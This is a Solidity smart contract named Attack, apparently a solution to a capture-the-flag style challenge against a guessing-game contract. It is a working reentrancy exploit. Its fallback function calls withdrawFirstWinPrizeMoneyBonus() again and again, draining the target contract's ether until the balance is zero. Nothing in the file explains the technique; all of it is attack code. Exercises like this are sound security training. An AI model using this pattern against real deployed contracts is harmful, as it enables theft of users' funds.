// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

interface VictimInterface {
    function currentPlayer() external view returns (address);

    function guess(uint8 _guess) external payable;

    function isSolved() external view returns (bool);

    function revealResults() external;

    function viewWins(address _addr) external view returns (uint256);

    function withdrawFirstWinPrizeMoneyBonus() external;

    function withdrawPrizeMoney(address _to) external payable;

    receive() external payable;
}

contract Attack {
    address payable contractAddr;
    
    constructor(address payable _victimAddress) {
        contractAddr = _victimAddress;
    }

    fallback() external payable {
        if (address(contractAddr).balance == 0) {
            return;
        } else {
            return VictimInterface(contractAddr).withdrawFirstWinPrizeMoneyBonus();
        }
    }

    function getBalance() public view returns (uint) {
        return address(contractAddr).balance;
    }

    function resultsReveal() public {
        return VictimInterface(contractAddr).revealResults();
    }

    function play() external payable {
        require(msg.value >= 1 ether);
        return VictimInterface(contractAddr).guess{value: 1 ether}(0);
    }

    function seeWins() public view returns (uint) {
        return VictimInterface(contractAddr).viewWins(address(this));
    }

    function attack() external payable {
        return VictimInterface(contractAddr).withdrawFirstWinPrizeMoneyBonus();
    }

}
